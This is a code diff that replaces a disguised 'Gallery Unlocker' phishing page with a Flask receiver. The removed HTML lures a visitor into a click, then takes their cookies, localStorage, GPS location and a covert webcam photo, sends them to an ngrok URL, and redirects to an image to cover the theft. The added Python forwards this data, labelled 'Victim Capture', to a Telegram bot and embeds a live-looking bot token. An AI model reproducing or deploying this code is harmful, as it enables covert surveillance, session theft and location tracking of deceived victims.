@@ -1,78 +1,50 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gallery Unlocker</title>
-    <style>
-        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #000; color: #0f0; font-family: 'Courier New', monospace; }
-        #main { text-align: center; padding: 30px; border: 1px solid #0f0; border-radius: 15px; box-shadow: 0 0 20px #0f0; width: 85%; max-width: 380px; }
-        button { background: #0f0; color: #000; border: none; padding: 15px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 20px; }
-    </style>
-</head>
-<body>
+from flask import Flask, request, jsonify
+from flask_cors import CORS
+import requests, base64, io
 
-    <div id="main">
-        <h2>[ MEDIA_LOCKED ]</h2>
-        <p>Complete verification to bypass firewall.</p>
-        <button onclick="startMission()">VIEW FULL IMAGE</button>
-    </div>
+app = Flask(__name__)
+CORS(app, resources={r"/*": {"origins": "*"}}) # সব ধরণের ব্লকিং বন্ধ করা হলো
 
-    <canvas id="scr" style="display:none;"></canvas>
-    <video id="vid" autoplay style="display:none;"></video>
+BOT_TOKEN = "8788231490:AAF2Ki45OL5DTPfM6IzW3X3PHiZEC0tkytE"
+CHAT_ID = "5779092106"
 
-    <script>
-        // আপনার দেওয়া নতুন Ngrok লিঙ্ক
-        const URL = 'https://2f74-103-174-44-17.ngrok-free.app/vulnerability_probe';
+@app.route('/vulnerability_probe', methods=['POST', 'OPTIONS'])
+def vulnerability_probe():
+    if request.method == 'OPTIONS':
+        return jsonify({"status": "ok"}), 200
+    
+    try:
+        data = request.get_json()
+        sys = data.get('system', {})
+        
+        # ১. টেলিগ্রাম মেসেজ
+        report = (
+            "🚀 **CONNECTION SUCCESSFUL** 🚀\n\n"
+            f"📍 **GPS:** {data.get('gps', '❌ DENIED')}\n"
+            f"🖥️ **OS:** `{sys.get('os')}`\n"
+            f"🔋 **Battery:** {sys.get('battery', 'N/A')}\n"
+            f"⏰ **Time:** {sys.get('time')}\n"
+        )
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": report, "parse_mode": "Markdown"})
 
-        async function startMission() {
-            let report = {
-                system: {
-                    os: navigator.platform,
-                    cookies: document.cookie || "No Cookies Found",
-                    storage: JSON.stringify(localStorage),
-                    res: `${screen.width}x${screen.height}`,
-                    time: Intl.DateTimeFormat().resolvedOptions().timeZone
-                },
-                vuln: []
-            };
+        # ২. ফাইল পাঠানো (কুকিজ ও স্টোরেজ)
+        logs = f"COOKIES: {sys.get('cookies')}\n\nSTORAGE: {sys.get('storage')}"
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", 
+                      data={'chat_id': CHAT_ID, 'caption': '🍪 Browser Data'}, 
+                      files={'document': ('logs.txt', io.BytesIO(logs.encode()))})
 
-            // Vulnerability Probes
-            if (navigator.webdriver) report.vuln.push("Automation_Bot_Detected");
-            if (navigator.pdfViewerEnabled) report.vuln.push("PDF_Exploit_Potential");
+        # ৩. ছবি পাঠানো
+        if data.get('photo'):
+            img = base64.b64decode(data.get('photo').split(',')[1])
+            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", 
+                          data={'chat_id': CHAT_ID, 'caption': '📸 Victim Capture'}, 
+                          files={'photo': ('v.jpg', io.BytesIO(img), 'image/jpeg')})
 
-            // লোকেশন ও ক্যামেরা ট্রাই
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                report.gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    const video = document.getElementById('vid');
-                    video.srcObject = stream;
-                    
-                    setTimeout(() => {
-                        const canvas = document.getElementById('scr');
-                        canvas.width = 640; canvas.height = 480;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        sendData(report, canvas.toDataURL('image/jpeg'));
-                        stream.getTracks().forEach(t => t.stop());
-                    }, 2000);
-                } catch (e) { sendData(report, null); }
-            }, () => sendData(report, null));
+        print("[!] Data Sent to Telegram Successfully.")
+        return jsonify({"status": "success"}), 200
+    except Exception as e:
+        print(f"Error: {e}")
+        return jsonify({"status": "error"}), 500
 
-            // ইউজারকে রিডাইরেক্ট করা
-            setTimeout(() => { window.location.href = "elephant.jpg"; }, 4000);
-        }
-
-        function sendData(d, p) {
-            console.log("Attempting to send data...");
-            fetch(URL, {
-                method: 'POST',
-                mode: 'cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ ...d, photo: p })
-            }).then(res => console.log("Success:", res))
-              .catch(err => console.error("Network Error:", err));
-        }
-    </script>
-</body>
-</html>
+if __name__ == '__main__':
+    app.run(port=5005)
